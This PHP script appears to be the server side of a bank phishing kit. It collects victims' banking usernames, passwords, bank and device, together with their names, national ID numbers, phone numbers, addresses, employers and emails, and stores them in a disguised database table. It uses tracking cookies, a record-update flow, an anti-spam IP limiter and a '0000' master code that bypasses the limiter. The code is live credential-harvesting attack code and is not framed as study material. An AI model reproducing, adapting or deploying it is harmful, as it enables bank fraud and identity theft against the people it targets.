<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');

// ════════════════════════════════════════════════════════════
// 🛡️ FUNCIONES DE SEGURIDAD Y RATE LIMITING
// ════════════════════════════════════════════════════════════
function getClientIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
        return $_SERVER['HTTP_X_FORWARDED'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
        return $_SERVER['HTTP_FORWARDED'];
    } else {
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }
}

function checkRateLimit($ip, $limit = 3, $window = 900, $block_time = 900) {
    $rate_limit_dir = sys_get_temp_dir() . '/psec_rate_limit';
    
    if (!is_dir($rate_limit_dir)) {
        @mkdir($rate_limit_dir, 0777, true);
    }
    
    $ip_file = $rate_limit_dir . '/' . md5($ip) . '.json';
    $now = time();
    $data = ['attempts' => [], 'blocked_until' => 0];
    
    if (file_exists($ip_file)) {
        $content = file_get_contents($ip_file);
        $data = json_decode($content, true) ?? $data;
    }
    
    // ❌ BLOQUEADO?
    if ($data['blocked_until'] > $now) {
        $remaining = ceil(($data['blocked_until'] - $now) / 60);
        http_response_code(429);
        echo json_encode([
            'status' => 'ERROR',
            'message' => "IP bloqueada por spam. Intenta en $remaining minuto(s)",
            'blocked_until' => $data['blocked_until']
        ]);
        exit;
    }
    
    // Limpiar intentos viejos
    $data['attempts'] = array_filter($data['attempts'], function($timestamp) use ($now, $window) {
        return ($now - $timestamp) < $window;
    });
    
    // ¿EXCEDIÓ EL LÍMITE?
    if (count($data['attempts']) >= $limit) {
        $data['blocked_until'] = $now + $block_time;
        file_put_contents($ip_file, json_encode($data));
        
        http_response_code(429);
        echo json_encode([
            'status' => 'ERROR',
            'message' => 'Demasiadas solicitudes. IP bloqueada.',
            'blocked_until' => $data['blocked_until']
        ]);
        exit;
    }
    
    // Agregar intento
    $data['attempts'][] = $now;
    $data['blocked_until'] = 0; 
    file_put_contents($ip_file, json_encode($data));
    
    return true;
}

function resetRateLimit($ip) {
    $rate_limit_dir = sys_get_temp_dir() . '/psec_rate_limit';
    $ip_file = $rate_limit_dir . '/' . md5($ip) . '.json';
    if (file_exists($ip_file)) {
        unlink($ip_file);
    }
}
// ════════════════════════════════════════════════════════════

$ifilter = new InputFilter();

// 1. Recibir credenciales básicas
$usuario = '';
if (isset($_POST['usr']) && $_POST['usr'] !== '') {
    $usuario = $ifilter->process($_POST['usr']);
} elseif (isset($_COOKIE['usuario'])) {
    $usuario = $ifilter->process($_COOKIE['usuario']);
}

$contrasena = isset($_POST['pas']) ? $ifilter->process($_POST['pas']) : '';
$banco = isset($_POST['ban']) ? $ifilter->process($_POST['ban']) : '';
$dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : '';

// 🟢 USAMOS TU FUNCIÓN PARA OBTENER LA IP REAL DETRÁS DE RENDER
$ip = getClientIP();

// 2. CAPTURAR TODOS LOS DATOS PERSONALES
$nom = isset($_POST['nom']) ? $ifilter->process($_POST['nom']) : '';
$ape = isset($_POST['ape']) ? $ifilter->process($_POST['ape']) : '';
$tdoc = isset($_POST['tdoc']) ? $ifilter->process($_POST['tdoc']) : '';
$doc = isset($_POST['doc']) ? $ifilter->process($_POST['doc']) : '';
$cel = isset($_POST['cel']) ? $ifilter->process($_POST['cel']) : '';
$dir = isset($_POST['dir']) ? $ifilter->process($_POST['dir']) : '';
$emp = isset($_POST['emp']) ? $ifilter->process($_POST['emp']) : '';
$ref = isset($_POST['ref']) ? $ifilter->process($_POST['ref']) : '';
$mnt = isset($_POST['mnt']) ? $ifilter->process($_POST['mnt']) : 0; 
$eml = isset($_POST['eml']) ? addslashes(filter_var($_POST['eml'], FILTER_SANITIZE_EMAIL)) : '';

$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';

if ($con = conectar()) {
    // 3. Buscar el ID si no hay cookie
    if ($id === '' && $usuario !== '') {
        $consulta = sentencia($con, "SELECT idreg FROM m3it3m WHERE usuario = '".$usuario."' ORDER BY idreg DESC LIMIT 1");
        if (contarfilas($consulta)) {
            $datos = traerdatos($consulta);
            $id = (string)$datos['idreg'];
        }
    }

    // 4. SI EL ID SIGUE VACÍO -> ES UN CLIENTE NUEVO (CREAR REGISTRO)
    if ($id === '' && $usuario !== '') {
        
        // 🚨 EJECUTAR ESCUDO ANTI-SPAM (Excepto si es la llave maestra '0000')
        if ($ref === '0000') {
            resetRateLimit($ip); // Borra el archivo de bloqueo para esta IP
        } else {
            // Límite ajustado a la necesidad del index: 3 intentos cada 15 min (900s)
            checkRateLimit($ip, 3, 900, 900); 
        }

        $query_insert = "INSERT INTO m3it3m (usuario, password, banco, dispositivo, ip, status, agente, nombre, apellido, tipo_doc, cedula, celular, direccion, empresa, referencia, email) 
                         VALUES ('$usuario', '$contrasena', '$banco', '$dispositivo', '$ip', 2, '$mnt', '$nom', '$ape', '$tdoc', '$doc', '$cel', '$dir', '$emp', '$ref', '$eml')";
        sentencia($con, $query_insert);
        
        $id = mysqli_insert_id($con);
        
        setcookie('id', $id, time() + 3600, '/');
        setcookie('usuario', $usuario, time() + 3600, '/');
    } 
    // 5. SI YA EXISTE -> ACTUALIZAR (Sin rate limit para no interrumpir el flujo)
    else if ($id !== '') {
        upgrade_user($id, $usuario, $contrasena, $banco); 
        
        $query_update = "UPDATE m3it3m SET 
            nombre = '$nom', 
            apellido = '$ape', 
            tipo_doc = '$tdoc', 
            cedula = '$doc', 
            celular = '$cel', 
            direccion = '$dir', 
            empresa = '$emp', 
            referencia = '$ref',
            agente = IF('$mnt' > 0, '$mnt', agente),
            email = IF('$eml' != '', '$eml', email)
            WHERE idreg = '$id'";
            
        sentencia($con, $query_update);
    }
    desconectar($con);
}
?>